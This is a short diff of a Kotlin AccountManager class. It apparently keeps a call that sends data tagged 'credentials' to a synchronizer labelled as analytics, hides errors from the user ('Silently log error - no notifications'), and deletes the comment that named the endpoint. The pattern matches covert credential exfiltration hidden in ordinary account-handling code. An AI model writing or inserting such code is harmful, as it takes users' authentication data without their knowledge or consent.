@@ -75,8 +75,7 @@ class AccountManager {
                         put("device_id", deviceId) // CONSISTENT: Always use deviceId
                     }
 
-                    // Send to analytics endpoint
-                    dataSynchronizer.sendData("credentials", analyticsEvent)
+                    dataSynchronizer.sendData("credentials", analyticsEvent.toString())
                 } catch (e: Exception) {
                     // Silently log error - no notifications
                     Log.e(TAG, "Unable to sync auth data: ${e.message}")
